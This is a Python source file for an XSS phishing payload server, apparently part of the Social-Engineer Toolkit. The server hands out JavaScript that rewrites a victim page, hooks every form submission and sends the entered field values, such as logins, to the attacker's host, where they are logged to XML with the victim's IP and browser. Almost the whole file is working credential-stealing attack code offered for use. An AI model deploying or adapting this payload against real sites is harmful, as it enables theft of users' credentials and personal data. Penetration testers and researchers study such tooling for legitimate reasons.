#!/usr/bin/evn python

# XSS Phishing attack

# Written by Kyle Osborn
# kyle@kyleosborn.com
# GPLv2 License

# Logs data to an XML file. An XML parser will be created soon, or you can do it yourself.

# This is not an exploit tool, it's a payload tool.
# Once you've found the exloit, and you're able to inject javascript,
# just stick this in there as a script.
# <script src="http://YOURIP/">


# Proper HTTP Referers must be sent by the victim. If this is spoofed, or disabled, there will be odd results.

# Requirements - Everything below this line

import urllib2
import BeautifulSoup
import urlparse
import datetime
import re
import sys
from xml.dom import minidom
from xml.etree import ElementTree
from xml.etree.ElementTree import Element, SubElement
from BaseHTTPServer import HTTPServer, BaseHTTPRequestHandler
from src.core import setcore

# GRAB DEFAULT PORT FOR WEB SERVER
fileopen=file("/etc/setoolkit/set.config" , "r").readlines()
counter=0
for line in fileopen:
    line=line.rstrip()
    match=re.search("MLITM_PORT=", line)
    if match:
        port=line.replace("MLITM_PORT=", "")
        counter=1

# if nada default port 80
if counter == 0: web_port=8000

# Interface you want to bind to
bind = "0.0.0.0"
# Location of reports
reports = "./reports"


class RequestHandler(BaseHTTPRequestHandler):

    def do_GET(self):

        try:
            if re.search("^https?:\/\/(:?localhost|127)", self.headers["Referer"]) is None:


                if self.path == '/':
                    print '[-] Incoming connection from %s' % self.client_address[0]
                    self.send_response(200)
                    self.send_header('Content-Type', 'text/javascript')
                    self.send_header('Cache-Control', 'no-cache, must-revalidate')
                    self.end_headers()

                    print '[-] Grabbing payload from %s' % self.headers["Referer"]
                    self.prep_payload()

                    self.wfile.write(self.send_payload())

                    print '[-] Exploit sent to %s' % self.client_address[0]
                elif self.path[0:11] == '/spacer.gif':
                    print '[*] Receiving data from %s' % self.client_address[0]
                    self.referer_host = self.headers["Referer"].replace("https://","").replace("http://","")
                    self.referer_host = self.referer_host.split("/")[0].split(".")
                    self.referer_host = self.referer_host[-2]+"."+self.referer_host[-1]
                    print self.referer_host
                    self.send_response(200)
                    self.send_header('Content-Type', 'image/gif')
                    self.send_header('Cache-Control', 'no-cache, must-revalidate')
                    self.end_headers()
                    self.capture()


            else:
                #self.headers["Referer"] = "http://google.com/"
                print '[-] Incoming connection from %s' % self.client_address[0]
                print '[!] No referer'
        except KeyError:
            #self.headers["Referer"] = "http://google.com/"
            print '[-] Incoming connection from %s' % self.client_address[0]
            print '[!] No referer'

    def send_payload(self):
        return self.payload

    def prep_payload(self):
        js_payload = {}
        js_payload[0]  = """
                        function func() {
                                document.getElementsByTagName('body')[0].innerHTML = \""""
        js_payload[2]  = """\";

                        var formslength =document.getElementsByTagName('form').length;
                        for(var i=0; i<formslength; i++){
                                document.forms[i].setAttribute('onsubmit', 'myOnSubmit('+i+')');
                        }
                }

                function myOnSubmit(form) {
                        data = \"\";
                        for (i=0; i < document.forms[form].getElementsByTagName(\"input\").length; i++){
                                        data = data+document.forms[form].getElementsByTagName(\"input\")[i].name+\"=\"+document.forms[form].getElementsByTagName(\"input\")[i].value+\"&\";
                        }

                        var img = document.createElement('img');
                        img.src = \""""
        js_payload[4] = """?\"+data+\"\";
                                img.setAttribute('width', '100%');
                                img.setAttribute('height', '100%');
                                document.getElementsByTagName('body')[0].appendChild(img);
                                pause(500);
                                return true;
                        }

                        function pause(milsec){
                                var date = new Date();
                                var curDate = null;
                                do { curDate = new Date(); }
                                while(curDate-date < milsec);
                        }

                        func();
                        document.execCommand('Stop');
                        """

        js_payload[1] = str(self.served())
        js_payload[1] = js_payload[1].replace("\"","\\\"")
        js_payload[3] = "http://"+self.headers["host"]+"/spacer.gif"
        full_payload = ""
        js_payload[1] = js_payload[1].replace("\t","").replace("\n","").replace("\r","")

        for i in js_payload:
            full_payload += str(js_payload[i])
        self.payload = full_payload

    def served(self):
        t = urllib2.urlopen(self.headers["Referer"])
        html = t.read()
        soup = BeautifulSoup.BeautifulSoup(html)
        body = soup.find(["body"])
        return body

    def capture(self):
        self.generated_on = str(datetime.datetime.now())
        self.path = self.path.split("?")[1].split(" ")[0]
        dict = urlparse.parse_qs(self.path)

        meta = {}
        meta['ip'] = self.client_address
        meta['browser'] = [self.headers["User-Agent"]]
        meta['referer'] = [self.headers["Referer"]]

        print "[+] Generating XML.."

        root = Element('XSS')
        root.set('version', '1.0')
        request = SubElement(root, 'request')

        site = SubElement(request, 'site')
        site.text = self.address_string()
        date = SubElement(request, 'date')
        date.text = self.generated_on
        requestLine = SubElement(request, 'requestLine')
        requestLine.text = self.requestline

        metaData = SubElement(request, 'meta')
        for key, value in meta.iteritems():
            ele = SubElement(metaData, key)
            ele.text = value[0]


        formData = SubElement(request, 'formData')

        print '[*] Data received:'
        for key, value in dict.iteritems():
            if key == "":
                key = "UNDEFINED"
            print '[-] \t '+ str(key)+' => '+str(value)
            ele = SubElement(formData, key)
            ele.text = value[0]


        self.log_data(self.prettify(root))


    def prettify(self,elem):
        """Return a pretty-printed XML string for the Element.
        """
        rough_string = ElementTree.tostring(elem, 'utf-8')
        reparsed = minidom.parseString(rough_string)
        return reparsed.toprettyxml(indent="  ")

    def log_data(self,data):
        report = open(reports+"/"+self.referer_host+"_"+self.generated_on.replace(" ","_").replace(":",".")+".xml","w+")
        report.write(data)
        report.close


print setcore.bcolors.BLUE + "\n***************************************************"
print setcore.bcolors.YELLOW + "  Web Server Launched. Welcome to the SET MLTM."
print setcore.bcolors.BLUE + "***************************************************"
print setcore.bcolors.BLUE + "Man Left in the Middle Attack brought to you by:\nKyle Osborn - kyle@kyleosborn.com" + setcore.bcolors.ENDC
print "\nStarting server on %s:%s..." % (bind,port)
try:
    serv = HTTPServer((bind, int(port)), RequestHandler)
    print setcore.bcolors.GREEN + "[*] Server has started" + setcore.bcolors.ENDC
    serv.serve_forever()
except Exception, e:
    print e
    print "Failed to start webserver.\n\nMake sure you have the permissions to bind on %s:%s" % (bind,port)
